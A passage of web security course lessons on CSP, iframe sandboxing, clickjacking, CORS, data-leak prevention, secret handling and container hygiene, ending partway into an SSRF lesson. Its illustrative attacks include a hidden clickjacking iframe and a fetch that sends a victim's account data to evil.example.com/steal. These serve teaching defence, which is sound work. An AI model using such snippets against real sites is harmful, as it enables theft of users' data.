## CH6: Client-Side Security

### L5: Content Security Policy

A Content Security Policy (CSP) lets a server declare which resources a page is allowed to load and execute. A CSP doesn't replace escaping your output, but it can limit the damage if an injection attack succeeds.

It's set via the Content-Security-Policy response header on an HTML page. For example, a weak policy might allow inline scripts:

Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'

'unsafe-inline' allows every inline <script> block and event handler, including ones injected through XSS. Yuck.

Even an app that serves several types of its own assets, embeds a same-origin widget, and renders a QR code as a data: image could use a stricter policy like this:

Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; frame-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'

This policy:

Loads scripts and styles only from the app's origin.

Allows same-origin images plus data: images.

Allows same-origin iframes.

Blocks plugins, injected base URLs, and form submissions to other origins.

Blocks every inline script because script-src contains neither 'unsafe-inline' nor a nonce.

Of course, a legitimate inline script will stop running too (so don't load it inline!). That's just a refactoring problem, not a reason to throw 'unsafe-inline' into the policy and let every inline script run.


Diagram of the CSP enforcement model

Assignment
Bearly Secure doesn't send a Content Security Policy. Add the strict baseline without granting exceptions for inline scripts or framing parents.

In internal/httpserver/middleware.go, add middleware that sends this header:

Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; frame-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'

Apply the middleware globally in internal/httpserver/app.go, immediately after cspNonce in the applyMiddleware chain.

Start the app, log in as Mabel, and place an order. Confirm CSP blocks the automatic PawPal redirect while its manual return link still works.

With Bearly Secure still running, run and submit the CLI tests from the project root.

### L6: Legitimate Inline Scripts

Moving all your own JavaScript into same-origin external files is usually the simplest way to keep a strict CSP. When a trusted inline script really has to stay inline, authorize just that one script with a per-response nonce.

Generate a fresh, unpredictable value for every HTML response:

nonceBytes := make([]byte, 16)
if _, err := rand.Read(nonceBytes); err != nil {
    return err
}
nonce := base64.StdEncoding.EncodeToString(nonceBytes)

Include the value in script-src:

Content-Security-Policy: script-src 'self' 'nonce-z7G4mN2qL8vP1sR5'

Then place the matching value on the trusted script element:

<script nonce="z7G4mN2qL8vP1sR5">
  window.location.assign("/orders/42");
</script>

The browser only executes inline scripts that carry the nonce from that response's policy. An attacker who can inject markup can't predict the next nonce, and an old nonce doesn't authorize a script in a new response.

Never reuse a fixed nonce or accept one provided from the client's request.

Assignment
Bearly Secure already generates a fresh CSP nonce for every response and renders it on PawPal's trusted redirect script, but its policy ignores the nonce. Allow only that nonce in script-src.

In internal/httpserver/middleware.go, update contentSecurityPolicy to load the response nonce with httpx.CSPNonce(request.Context()) and add the matching 'nonce-<value>' source to script-src without allowing 'unsafe-inline'.

Start the app, log in as Mabel, and confirm PawPal redirects automatically after checkout.

With Bearly Secure still running, run and submit the CLI tests from the project root.

### L7: Sandboxing 'iframe' Elements

An iframe embeds another webpage inside the current page. Third-party widgets, ads, maps, and videos often use iframes, but an unrestricted iframe can give the embedded page waaaay more browser capabilities than it actually needs.

The HTML sandbox attribute removes capabilities from one embedded document:

<iframe src="/shipping-widget.html" sandbox="allow-scripts"></iframe>

If the sandbox is empty, all restrictions are applied by default. Alternatively, you can grant back specific capabilities with space-separated keywords, for example:

allow-scripts lets the framed page run JavaScript.

allow-same-origin preserves the framed page's real origin, which may restore access to its cookies and local storage. If the frame and parent are same-origin, it also lets their scripts access each other's documents.

allow-forms lets the framed page submit forms.

allow-popups lets the framed page open new windows.

You can see the full list of sandbox tokens on MDN.

As always, follow the principle of least privilege: only grant the permissions that the embedded page actually needs!

Don't combine allow-scripts and allow-same-origin for same-origin untrusted content. Together, those permissions can let the embedded document remove its own sandbox attribute, making the sandbox useless!

Assignment
The Acorn Express frame on Bearly Secure's checkout page can access more than its estimator needs. Allow scripts while blocking same-origin access.

Start the app, log in as Mabel, add a product, and open checkout. Confirm the unsandboxed widget can read the host page title.

In web/templates/checkout.html, add sandbox="allow-scripts" to the shipping-widget iframe.

Confirm delivery estimation still works and the widget reports that host-page access is blocked.

With Bearly Secure still running, run and submit the CLI tests from the project root.

### L8: Clickjacking

Clickjacking tricks a user into clicking on a real application that has been disguised (or hidden) inside an attacker's page.

The attacker might place a sensitive page underneath a fake button:

<button>Claim free gems</button>

<iframe
  src="https://bank.example.com/confirm-transfer"
  style="opacity: 0; position: absolute; top: 0; left: 0;"
></iframe>

If the victim is signed in to bank.example.com, the framed page loads with their bank session. The attacker doesn't need to read the page, they just need to bait the victim into clicking on the fake button and triggering the real page's action.

Control Framing
The frame-ancestors CSP directive controls which parent origins can embed a response:

Content-Security-Policy: frame-ancestors 'self'

'self' allows same-origin parents while blocking an attacker's origin.

The older X-Frame-Options header can provide a fallback for older browsers:

X-Frame-Options: SAMEORIGIN

If your app never needs to be framed, just use frame-ancestors 'none' and X-Frame-Options: DENY. If it intentionally supports same-origin framing, use 'self' and SAMEORIGIN instead.

Assignment
Bearly Evil can frame Bearly Secure's account page. Block cross-origin framing without breaking Acorn Express.

Start Bearly Secure and log in as Mabel. In another shell, start Bearly Evil:

go run ./cmd/attackerlab

At http://localhost:4040/, confirm the framing and clickjacking section displays Mabel's account page.

In the existing security middleware, add frame-ancestors 'self' to CSP and send X-Frame-Options: SAMEORIGIN.

With Bearly Secure and Bearly Evil still running, run and submit the CLI tests from the project root.

You can stop Bearly Evil after submitting the lesson.

### L9: Same-Origin and Referrer Policies

The same-origin policy stops client-side JavaScript from reading data from another origin unless that origin explicitly allows it.

An origin combines scheme (https), host (api.example.com), and port (443), so changing any one of them changes the origin.

Cross-Origin Reads
Imagine a user is logged into https://bank.example.com, then visits an attacker-controlled sibling origin at https://evil.example.com. Without the same-origin policy, the attacker's page could do this:

// make a request for account details using the user's
// signed-in session cookie
const response = await fetch("https://bank.example.com/account", {
  credentials: "include",
});
const account = await response.json();

// send the sensitive data back to the attacker's server
await fetch("https://evil.example.com/steal", {
  method: "POST",
  body: JSON.stringify(account),
});

The two origins are same-site (example.com), so the browser may send the bank's SameSite cookie when fetch opts into credentials, but it will not let JavaScript on evil.example.com read the response unless the bank explicitly allows it.

The same-origin policy mostly restricts reads, but not all writes. A malicious page might be able to submit a form or load an image from another origin, but reading private response data is blocked by default.

Referrer Policy
The same-origin policy does not control how much of the current URL a browser sends in the Referer request header when a user follows a link or loads a resource.

The HTTP Referer request header identifies the page that initiated a request. For example, when someone follows a Google or GitHub link to Boot.dev, the request to our homepage may contain a Google or GitHub URL in its Referer header (very useful for analytics).

Instead, an explicit Referrer-Policy header keeps that behavior predictable:

Referrer-Policy: strict-origin-when-cross-origin

It allows the full URL on same-origin requests, sends only the origin on HTTPS-to-HTTPS cross-origin requests, and sends no referrer when navigating from HTTPS to HTTP. Modern browsers use this policy by default, but setting the header makes your application's choice explicit.

So, the same-origin policy limits cross-origin reads, while the referrer policy limits the URL information sent with requests.

Assignment
Bearly Secure relies on browser defaults. Send Referrer-Policy: strict-origin-when-cross-origin on every response.

Add the header to Bearly Secure's global security middleware.

Start the app.

With Bearly Secure still running, run and submit the CLI tests from the project root.

### L10: Cross-Origin Resource Sharing
Cross-Origin Resource Sharing (CORS) lets a server tell browsers which other origins may read its responses. It's a browser security mechanism, not authentication, and it doesn't stop requests from curl, server-side programs, or other non-browser clients.

Click to hide video

Preflight
For some cross-origin requests, the browser sends a preflight OPTIONS request before the real request. The response needs to approve the requesting origin, method, and any non-safelisted headers. Otherwise, the browser refuses to send the actual request.

Requests that don't require preflight may still be sent, but JavaScript can't read their responses unless the server grants access.

Bearly Secure's CORS Bug
Bearly Secure reflects every requesting Origin into Access-Control-Allow-Origin and sends Access-Control-Allow-Credentials: true. Instead of limiting access, that policy tells the browser that any website asking for authenticated data may read it.

An attacker's page can make a credentialed request:

const response = await fetch("http://localhost:3030/api/account", {
  credentials: "include",
});
const account = await response.json();

The same-origin policy would normally block the attacker from reading the response. Bearly Secure's CORS headers explicitly grant that origin access, so the browser exposes the authenticated data to the attacker's JavaScript.

#### Quiz

##### Question 1

Bearly Evil cannot read Bearly Secure's HTML account page, but it can read the authenticated account API response. Why does the API read succeed?
- 1 The same-origin policy protects HTML responses but does not apply to JSON API responses.
- 2 Setting credentials: "include" tells the browser to ignore the same-origin policy for that request.
- 3 CORS authenticates Bearly Evil as a trusted client after the browser sends the session cookie.
- 4 Bearly Secure reflects the attacker's origin in its CORS response and allows credentials, explicitly granting that origin access to the API response.

##### Question 2

Bearly Evil attempts a cross-origin PUT that requires a preflight. Which outcome follows if Bearly Secure does not authorize PUT in the preflight response?
- 1 The browser sends the PUT but hides only its response body.
- 2 The browser retries the PUT without credentials or custom headers.
- 3 The browser refuses to send the actual PUT request.
- 4 Bearly Secure accepts the PUT because CORS applies only to GET requests.

#### Explain
Let's break down each question to see why those answers are correct.

Question 1: Why does the API read succeed?
Correct Answer: Bearly Secure reflects the attacker's origin in its CORS response and allows credentials, explicitly granting that origin access to the API response.

By default, the browser enforces the Same-Origin Policy (SOP). Under SOP, scripts running on bearlyevil.com cannot read data returned from bearlysecure.com.

When Bearly Evil makes a fetch request with credentials: "include", two things happen:

The browser automatically attaches the victim's session cookies for bearlysecure.com.

Bearly Secure's server misconfiguration comes into play: instead of checking an allowlist of approved domains, it dynamically copies the incoming Origin header (http://bearlyevil.com) directly into the response header:

Access-Control-Allow-Origin: http://bearlyevil.com
Access-Control-Allow-Credentials: true

Because Access-Control-Allow-Origin explicitly names the attacker's origin and Access-Control-Allow-Credentials is set to true, the browser considers the response authorized. As a result, the browser hands the sensitive JSON response directly to the malicious script.

Question 2: What happens if PUT is not authorized in the preflight?
Correct Answer: The browser refuses to send the actual PUT request.

Certain HTTP methods (such as PUT or DELETE) and custom headers can modify data on the server and are not considered "simple requests." Before sending them across origins, the browser must first send a preflight OPTIONS request.

The preflight essentially asks the server:

"I'm planning to send a PUT request from this origin. Do you allow that?"

The server must reply with the allowed methods in the Access-Control-Allow-Methods header (e.g., Access-Control-Allow-Methods: GET, POST, PUT).

If Bearly Secure does not authorize PUT in that preflight response:

The preflight check fails.

The browser halts execution immediately and refuses to send the actual PUT request.

This prevents potentially destructive actions from ever reaching the server's application logic if the cross-origin policy is not satisfied beforehand.

### L11: Route-Scoped CORS
CORS permission belongs only on routes intentionally available to other browser origins. Applying it globally can expose authenticated APIs.

Imagine middleware that reflects every origin and allows credentials:

func permissiveCORS(next http.Handler) http.Handler {
    return http.HandlerFunc(func(responseWriter http.ResponseWriter, request *http.Request) {
        if origin := request.Header.Get("Origin"); origin != "" {
            responseWriter.Header().Set("Access-Control-Allow-Origin", origin)
            responseWriter.Header().Set("Access-Control-Allow-Credentials", "true")
        }
        next.ServeHTTP(responseWriter, request)
    })
}

That gives every requesting website permission to read authenticated responses. Scary!

Public and Private APIs
A storefront can have different policies for different routes:

A public product catalog may allow credential-free cross-origin reads.

Account and order APIs contain authenticated data and don't need cross-origin access.

For a public response, Access-Control-Allow-Origin: * is appropriate because the data needs no credentials. Its preflight response can advertise only GET, without allowing credentials or unnecessary request headers. Authenticated routes should omit CORS permission headers entirely.

Assignment
Bearly Secure grants every requesting origin access to all dynamic APIs. Replace the global policy with CORS limited to the public product API.

Start Bearly Secure and log in as Mabel. In another shell, start Bearly Evil:

go run ./cmd/attackerlab

At http://localhost:4040/, run the cross-origin resource-sharing test and confirm the account API response is readable.

Remove the permissive global CORS middleware.

For GET /api/products, send Access-Control-Allow-Origin: * and omit Access-Control-Allow-Credentials.

Add an OPTIONS /api/products handler that returns 204 No Content, allows origin * and method GET, and omits Access-Control-Allow-Credentials and Access-Control-Allow-Headers.

Leave authenticated account and order APIs without CORS permission headers.

With Bearly Secure and Bearly Evil still running, run and submit the CLI tests from the project root.

You can stop Bearly Evil after submitting the lesson.

### L12: Security Header Middleware

Security headers let a server tell the browser which behavior to permit, but they're easy to configure inconsistently. Bearly Secure already has separate middleware for several policies. One focused middleware keeps the complete browser-security baseline together without adding a dependency just to set headers.

Add the Remaining Baseline
The existing CSP, nonce, framing, referrer, and nosniff policies need to remain intact. The consolidated middleware also adds narrow defaults:

Cross-Origin-Opener-Policy: same-origin isolates the top-level browsing context from cross-origin openers.

Cross-Origin-Resource-Policy: same-origin prevents other origins from loading the application's resources by default.

Origin-Agent-Cluster: ?1 requests origin-keyed browser isolation.

Legacy defensive headers disable DNS prefetching, browser download opening, cross-domain policy files, and obsolete XSS filtering.

A sandboxed iframe without allow-same-origin has an opaque origin. The global same-origin resource policy would therefore block the shipping widget's own stylesheet and script. Override it only on those two public assets.

Transport policy remains separate. A local HTTP app should not send Strict-Transport-Security or CSP's upgrade-insecure-requests directive.

Assignment
Bearly Secure's browser policies are split across middleware. Consolidate them and add the remaining header baseline without changing existing behavior.

Replace the separate CSP and content-type middleware with one securityHeaders middleware that preserves:

The per-response nonce and current CSP directives

Referrer-Policy: strict-origin-when-cross-origin

X-Content-Type-Options: nosniff

X-Frame-Options: SAMEORIGIN

Add these headers globally:

Cross-Origin-Opener-Policy: same-origin

Cross-Origin-Resource-Policy: same-origin

Origin-Agent-Cluster: ?1

X-DNS-Prefetch-Control: off

X-Download-Options: noopen

X-Permitted-Cross-Domain-Policies: none

X-XSS-Protection: 0

When serving shipping-widget.css and shipping-widget.js, override Cross-Origin-Resource-Policy with cross-origin so the sandboxed widget can load them.

Start the app.

With Bearly Secure still running, run and submit the CLI tests from the project 

## CH7: Data Leaks

### L1: Data Leaks
An endpoint can pass every authorization check and still reveal more data than it should. Imagine an online bookstore that sends its full inventory records to every shopper:

func booksHandler(responseWriter http.ResponseWriter, request *http.Request) {
    books, err := store.ListAllBooks(request.Context())
    if err != nil {
        http.Error(responseWriter, "Something went wrong", http.StatusInternalServerError)
        return
    }
    _ = json.NewEncoder(responseWriter).Encode(map[string]any{"books": books})
}

Those records might include supplier costs, unpublished titles, acquisition notes, and internal audit fields. The storefront didn't need any of that.

Maybe the endpoint was safe when the table it was reading from only contained public fields. But as the data model grows, every endpoint that returns the whole record inherits its new private data. Oopsie.

Explicit Response Shapes
You should explicitly control what crosses the server-to-client boundary! A typed response shape gives you a stable public contract that doesn't grow just because the database model does:

type bookResponse struct {
    ID     int64  `json:"id"`
    Title  string `json:"title"`
    Author string `json:"author"`
}

func toBookResponse(book Book) bookResponse {
    return bookResponse{
        ID:     book.ID,
        Title:  book.Title,
        Author: book.Author,
    }
}

Return the fields the client is allowed to see, not the value you happen to store in your database.

Assignment
Bearly Secure's public product and customer order APIs return complete stored models. Return explicit public response shapes instead.

In internal/api/handler.go, define a productResponse containing only id, name, description, image_path, and price_cents.

Define an orderResponse containing only id, status, total_cents, and created_at. Reuse the existing orderItemResponse for order items.

Convert the stored models returned by these handlers into the public response types:

GET /api/products

GET /api/account/orders

GET /api/orders/{id}

Return only active products from the public product API using storefront.Store.ListProducts. Remove storefront.Store.ListAllProducts and the JSON tags from the private storefront.Product model.

Keep the warehouse integration API and the server-rendered admin and support pages working as before.

Start the app.

With Bearly Secure still running, run and submit the CLI tests from the project root.

### L2: Sanitizing Error Messages
Error messages are for developers, but attackers love to read them too. Imagine a ticketing site that returns a failed SQL query and stack trace in the HTTP response anytime the checkout handler crashes. The attacker now knows table names, local file paths, and which library code to probe next.

Even if the error isn't directly exploitable, it gives the attacker a handy little map of the system.

Error leaks usually happen when diagnostic details meant for developers get passed straight into an HTTP response:

// broken: returns developer diagnostics to the client
func writeInternalError(responseWriter http.ResponseWriter, err error) {
    http.Error(responseWriter, err.Error(), http.StatusInternalServerError)
}

Public Responses, Private Diagnostics
The client and your logs cross different trust boundaries. Users need a low-detail failure message and a safe next step. Developers need enough server-side context to debug.

// fixed: logs the details and returns a generic response
func writeInternalError(responseWriter http.ResponseWriter, err error) {
    slog.Error("request failed", "error", err)
    http.Error(responseWriter, "Something went wrong", http.StatusInternalServerError)
}

The generic "Something went wrong" response is not about hiding that a failure happened. It's about keeping private diagnostics on the server, where they belong. You can often provide a safe next step, like "Please try again later" or "Contact support if the problem persists," but never include the raw stack trace.

Assignment
Bearly Secure's shared error responders return their server-side diagnostics to the client. Sanitize 500-level responses without changing their status codes or weakening diagnostics.

In internal/httpx/respond.go, make RespondWithError replace the client message for every 500-level response with The request failed. Try again, or return to the store. Keep printing the original diagnostic on the server.

Make RespondWithErrorPage use the same safe message and the title Something Went Wrong for every 500-level response.

Preserve the supplied messages and titles for responses below 500.

Start the app.

With Bearly Secure still running, run and submit the CLI tests from the project root.

### L3: Global Error Handling
Global Error Handling
A safe error response is useless if one forgotten handler lets a panic escape. In Go, recovery middleware gives you one final boundary between unexpected failures and public responses.

Install a deferred function before calling the next handler. If downstream code panics, recover can capture the value so the middleware can log it and return a generic response:

func recoverPanics(next http.Handler) http.Handler {
    return http.HandlerFunc(func(responseWriter http.ResponseWriter, request *http.Request) {
        defer func() {
            if recovered := recover(); recovered != nil {
                slog.Error("unhandled panic", "value", recovered)
                http.Error(responseWriter, "Something went wrong", http.StatusInternalServerError)
            }
        }()

        next.ServeHTTP(responseWriter, request)
    })
}

Some failures are expected or handler-specific and should be handled where they occur. A missing concert ticket should get a deliberate 404, and invalid checkout input should get a client-safe 400. Recovery middleware is a last resort for unexpected panics, not a replacement for ordinary error handling.

Handle expected failures locally. Use recovery middleware to log unexpected panics and return a safe 500.

#### Quiz
#### Explain
All three follow one security principle: clients get safe, intentional responses; servers keep detailed diagnostics in logs.

1. Missing file vs. filesystem failure
- A missing requested file is an expected condition, so a deliberate 404 Not Found is appropriate.
- A filesystem read failure is unexpected and may reveal internals if exposed. Log the real error server-side, but return a generic 500 Internal Server Error.

2. Why defer before next.ServeHTTP
- recover() only catches a panic when it runs inside a deferred function on the same goroutine.
- The deferred function must be registered before invoking the downstream handler, so it is waiting if that handler panics.

3. Never return panic details
- A panic might contain secrets such as connection strings, file paths, or stack details.
- Log that diagnostic information for developers, then send clients a generic 500 message.


### L4: Sanitizing Logs
Logs are great for observability, but they shouldn't be treated like a vault. They often outlive the requests that produced them, get copied into third-party tools and backups, and are readable by more people than the production database.

Of course, you should always do your best to keep logs private, but you should also avoid putting secrets in logs in the first place.

Secrets in Logs
Imagine an app that logs the working credential from every password-reset request:

logger.Event("password_reset_request", map[string]any{
    "accountId":  account.ID,
    "success":    true,
    "resetToken": resetToken,
})

Anyone who can read the log can now take over that account. Yikers.

Log What You Need
Log only what a developer or system administrator will actually need to investigate the system. A login event usually needs the account ID and outcome, not the session credential that proves the user is authenticated:

logger.Event("login_attempt", map[string]any{
    "accountId": account.ID,
    "success":   true,
})

For a codebase with many structured log calls, centralized redaction is a great idea:

var sensitiveFields = map[string]struct{}{
    "sessionId":  {},
    "resetToken": {},
    "secret":     {},
}

func redact(fields map[string]any) map[string]any {
    redacted := make(map[string]any, len(fields))
    for name, value := range fields {
        if _, sensitive := sensitiveFields[name]; sensitive {
            redacted[name] = "[REDACTED]"
            continue
        }
        redacted[name] = value
    }
    return redacted
}

This exact-key pattern only redacts the top-level fields it knows about. It won't catch apiToken under a different name or inside a nested value. Some structured logging libraries provide tested, more powerful redaction.

Redaction is a backstop, not permission to log everything. Don't even try to log a secret when the event doesn't need it.

Assignment
Bearly Secure's structured logs contain session IDs, reset credentials, TOTP secrets, internal notes, and storage paths. Redact sensitive fields centrally before writing them.

In internal/logging/logger.go, treat these exact top-level keys as sensitive: sessionId, resetToken, resetLink, secret, adminNotes, and storagePath.

In Logger.Event, replace each sensitive value with "[REDACTED]" before encoding the record. Preserve all other fields.

Start the app.

With Bearly Secure still running, run and submit the CLI tests from the project root.

## CH8: Infrastructure Security
### L1: Managing Secrets
Managing Secrets
A secret is any value that grants access, signs data, or proves identity. If an attacker steals one, they don't need to break in... they can just use the credential. Common secrets include:

API keys

Database credentials

OAuth client secrets

Session and JSON Web Token signing keys

Webhook signing secrets

Configuration isn't automatically secret. A port number, feature flag, or public service URL can live in configuration without needing protection. The real question is what the value lets someone do.

Imagine an app that commits its adminAPIAccess key directly in source code. You might think, "Well, the repo is private, so no one can see it," but now the key spreads through Git history, CI logs, backups, and developer machines. Deleting the line in a later commit doesn't erase those copies! The only safe option is to rotate the key.

If a real secret is ever committed to a repository, treat it as compromised. Revoke or rotate it first, then remove it from the code and investigate where else it spread.

#### Quiz
#### Explain
Let's look at why those are the correct answers for each question:

Question 1: What must be kept secret?
Correct answer: The PawPal API key

Configuration vs. Secret: Configuration data describes how an application runs, whereas secrets grant access or prove identity.

A port (e.g., 8080), an app origin (e.g., https://example.com), and a feature flag (e.g., enableCheckout: true) control behavior and routing, but knowing them does not allow an attacker to impersonate your system or access privileged resources.

An API key provides authentication and authorization to external services or data. Anyone who gets hold of it can act on behalf of your application, consume your paid quota, or steal sensitive user data.

Question 2: Why rotate the key instead of just deleting it?
Correct answer: Rotate the key, remove it, and investigate where it spread.

Git remembers history: Simply removing the secret in a subsequent commit (git commit -m "remove secret") does not delete the commit where it was originally added. The key remains visible to anyone who clones the repository or views its Git history.

Immediate compromise: Once pushed, a secret can easily be pulled into CI/CD build logs, developer machines, backups, or caught by automated scrapers monitoring public and private repositories.

The remedy: Because you cannot reliably assume the key was never seen or cached, you must rotate (revoke) the key immediately to invalidate the old credential, clean it out of the repository, and check audit logs to see if unauthorized access occurred.

### L2: Injecting Secrets at Runtime
Injecting Secrets at Runtime
Apps need secrets at runtime, but those secrets shouldn't live in source code. A common approach is to inject them through environment variables.

Centralizing required configuration gives every secret the same validation behavior:

func requireEnvironmentVariable(environment map[string]string, name string) (string, error) {
    value := environment[name]
    if value == "" {
        return "", fmt.Errorf("missing required environment variable: %s", name)
    }
    return value, nil
}

Read required configuration during startup. If PAWPAL_API_KEY is missing, fail immediately instead of waiting until a customer tries to check out. That's safer and easier to debug.

Secrets don't need to use environment variables, and environment variables can still be handled insecurely. The important part is that secrets are not committed to source code. Inject them when the app starts from a protected source.

Assignment
Bearly Secure uses a PawPal API key committed in its configuration package. Replace that hard-coded key with required runtime configuration.

In internal/config/config.go, add a helper that returns a required environment value or an error when it is empty.

In Parse, require PAWPAL_API_KEY and assign it to Config.PawPalAPIKey instead of using the starter key.

Start the app with a dummy key and confirm startup succeeds. Keep it running.

PAWPAL_API_KEY=pawpal_test_local go run ./cmd/server

With Bearly Secure still running, run and submit the CLI tests from the project root in another terminal.

### L3: Protecting Secrets
Moving a secret out of source code is only the first step. Local files that contain injected secrets also need to stay out of version control.

As a general rule, environment files should be ignored:
```
.env*
!.env.example
```
A committed .env.example conventionally documents the expected names with dummy values:
```
APP_ORIGIN=http://localhost:3030
PAWPAL_API_KEY=replace_with_your_pawpal_api_key
```
Developers can copy that template to .env and supply their own local values. In Go, a package such as godotenv can read the file during startup. Load .env first and then overlay the process environment so an explicitly injected value takes precedence.

Assignment
Bearly Secure requires runtime configuration but does not safely load local environment files. Add a protected local configuration workflow and use a stable download-signing key.

1. Use godotenv in internal/config/config.go to read .env from workingDirectory when the file exists.

2. Load values from .env, then overwrite them with values from os.Environ() so inline variables take precedence.

3. Use the loaded secrets in both Load and LoadAttackerLab.

4. In Parse, require DOWNLOAD_SIGNING_KEY and decode it as exactly 64 hexadecimal characters into a [32]byte. Return an error for any other value.

5. In internal/httpserver/app.go, stop generating a random download signing key at startup.

6. Add the loaded signing key to config.Config and httpserver.Options, then pass it from cmd/server/main.go to the HTTP server.

7. Add DOWNLOAD_SIGNING_KEY=replace_with_64_hex_characters to .env.example.

8. Ignore every .env variant while keeping .env.example tracked.

9. Copy .env.example to .env and replace its placeholders with valid dummy values. You can generate a signing key with:

`openssl rand -hex 32`

10. Start the app without inline environment variables:

`go run ./cmd/server`

With Bearly Secure still running, run and submit the CLI tests from a separate terminal in the project root.

### L4: Build Artifacts and Deployment Hygiene
A production container should contain what the app needs to run and not much else. Extra tools and files increase image size and give an attacker more to work with.

This Dockerfile builds and runs a Go app in one image:
```
FROM golang:1.27.0-alpine

WORKDIR /app
COPY . .
RUN go build -o server ./cmd/server
CMD ["./server"]
```
It copies the entire build context and leaves the compiler, module cache, and source code in the production image. A multi-stage build can compile the binaries separately and copy only runtime artifacts into a smaller final stage:
```
FROM golang:1.27.0-alpine AS build
WORKDIR /src
COPY go.mod go.sum ./
RUN go mod download
COPY . .
RUN CGO_ENABLED=0 go build -trimpath -o /out/server ./cmd/server

FROM alpine:3.22
RUN apk add --no-cache ca-certificates && addgroup -S app && adduser -S -G app app
WORKDIR /app
COPY --from=build /out/server ./server
USER app
CMD ["./server"]
```
`RUN CGO_ENABLED=0 go build -trimpath -o /out/server ./cmd/server`: The build stage compiles the Go binary and puts in /out/server

`COPY --from=build /out/server ./server`: The runtime stage copies the binary from the build stage to the runtime stage.

The exact runtime files depend on the app. Explicitly copy only the binaries and assets production needs, and run the process as an unprivileged user.

Running as the unprivileged bearly user limits what a compromised process can do. The user still needs permission to perform Bearly Secure's ordinary runtime work.

Assignment
Bearly Secure's production image contains the whole project and Go toolchain. Replace it with a narrow multi-stage image.

1. In `Dockerfile`, use `golang:1.27.0-alpine` as a build stage and compile static `bearly-secure` and `bearly-attacker-lab` binaries from their `cmd/` packages with `CGO_ENABLED=0`.

2. Use `alpine:3.22` for the runtime stage and install CA certificates.

3. Create an unprivileged `bearly` user and group, and set `/app` as the working directory.

4. Copy only the two binaries, `attacker-lab/`, `web/`, and `data/uploads/mystery-shack-tax-exemption.pdf` into the runtime stage. Do not use `COPY . .` there.

5. Give `bearly` ownership of `/app/data`, switch to that user, and configure the container to start `./bearly-secure`.

6. If Docker is available, build the image and confirm the runtime user ID is nonzero.
```
docker build -t bearly-secure .
docker run --rm --entrypoint id bearly-secure -u
```
Run and submit the CLI tests from the project root.

### L5: Limiting Build Context
A .dockerignore file removes files from the build context before Docker sends it to the builder. Ignored local data never becomes available to Dockerfile instructions.

A useful ignore file targets files that are local, generated, sensitive, or irrelevant to production, not source files the build needs:
```
.env*
.git/
tmp/
*.log
data/*.sqlite*
data/uploads/*
!data/uploads/sample-document.pdf
```
The Dockerfile and `.dockerignore` solve different problems:
- .dockerignore controls what the builder can see.
- The Dockerfile controls what is copied into each image stage.

Use both boundaries. A narrow Dockerfile doesn't justify sending secrets to the builder, and a strong .dockerignore doesn't make COPY . . precise.

Assignment
Bearly Secure's narrow Dockerfile still sends the entire project to the builder. Add a .dockerignore that limits the build context without removing required inputs.

1. Ignore:
- environment files
- Git directory
- temporary files
- logs
- local databases
- bulk-import documents (data/bulk-tax-documents/)
- runtime uploads (data/uploads/)

2. Keep `go.mod`, `go.sum`, Go source, `web/`, `attacker-lab/`, and `data/uploads/mystery-shack-tax-exemption.pdf` available to the Dockerfile.

3. If Docker is available, rebuild the image and confirm the PDF is still included.
```
docker build -t bearly-secure .
docker run --rm --entrypoint test bearly-secure -f /app/data/uploads/mystery-shack-tax-exemption.pdf
```
Run and submit the CLI tests from the project root.

### L6: Source Code and Config Leaks
A web server can expose source code and configuration simply because its static-file boundary is too broad. Imagine a Go app that serves the entire working directory:
```
fileServer := http.FileServer(http.Dir("."))
mux.Handle("GET /", fileServer)
```
That might make `/web/public/logo.png` available, but it can also expose `/go.mod`, application source, and other project files.

Serve a deliberately curated directory instead:
```
publicFiles := http.FileServer(http.Dir("web/public"))
mux.Handle("GET /", publicFiles)
```
A URL prefix does not narrow the filesystem root by itself. Mounting the first handler under `/assets/` would still publish files from `.`; it would only change the URLs used to reach them.

#### Quiz
##### Question 1
Bearly Secure needs to serve browser assets while keeping Go source, module files, Git history, and local configuration private. Which setup creates the clearest leak?

1. Serving the project working directory with an http.FileServer (correct)
2. Serving only web/public with an http.FileServer
3. Registering an explicit handler for styles.css
4. Embedding only the intended browser assets in the binary

##### Question 2
An engineer serves the project directory under the URL prefix /assets/ and assumes source files are now protected. Why is the leak still present?

1. The URL prefix changes routes, not the filesystem root being served. (correct)
2. Go serves only images from routes named /assets/.
3. Browsers can access files only from the root URL.
4. A URL prefix automatically exposes dotfiles but not Go files.

#### Explained
Both answers come down to the difference between which folder on your server is exposed and what URL path points to it.

Question 1: Why serving the working directory creates a leak
When you pass http.Dir(".") to http.FileServer, you are telling Go to make the entire current working directory (your project root) downloadable over HTTP.

Even if you only intend for browsers to fetch web/public/logo.png, anyone can request /go.mod, /main.go, /.env, or /.git/config because all of those files live inside ..

The other options avoid this by restricting what is exposed:

Serving only web/public limits the file server to a dedicated asset folder.

Registering an explicit handler for styles.css only serves that single file.

Embedding only the intended browser assets in the binary ensures nothing else is included.

Question 2: Why a /assets/ URL prefix doesn't fix it
Mounting http.FileServer(http.Dir(".")) under /assets/ only changes the URL route used to reach the files—it does not change the filesystem directory being served.

With that setup, a request to /assets/go.mod would still map to ./go.mod on disk (unless http.StripPrefix isn't used, in which case it looks for ./assets/go.mod, though the root problem remains that . is still the configured root). To actually prevent the leak, you have to narrow the directory passed to http.Dir(...) itself, such as http.Dir("web/public").

### L7: Public File Leaks
Imagine a recipe app that correctly limits static serving to web/public/, but leaves web/public/internal-config.json inside that directory. Derp.

You could add special-case handler logic that blocks that one filename. But then the security boundary depends on logic someone might forget to preserve. Remove private data from the public directory entirely. It's simpler, and simpler is easier to keep secure.

An obscure filename or unlinked URL doesn't make a public file private. If server-side code needs the file, store it outside the static root.

Assignment
Bearly Secure publishes operational details from web/public/internal-config.json. Remove the private file without breaking intended assets.

Remove web/public/internal-config.json.

Start the app.

Confirm http://localhost:3030/internal-config.json returns 404 Not Found while http://localhost:3030/styles.css still loads.

With Bearly Secure still running, run and submit the CLI tests from the project root.

### L8: Server-Side Request Forgery
Servers can often reach systems that a visitor's browser can't: loopback interfaces, private networks, and cloud infrastructure endpoints. Server-side request forgery (SSRF) happens when an attacker tricks a server into sending a request that borrows that privileged network position.

Click to hide video

Imagine a travel app whose image-preview tool accepts a URL and fetches it directly:

response, err := http.Get(imageURL)

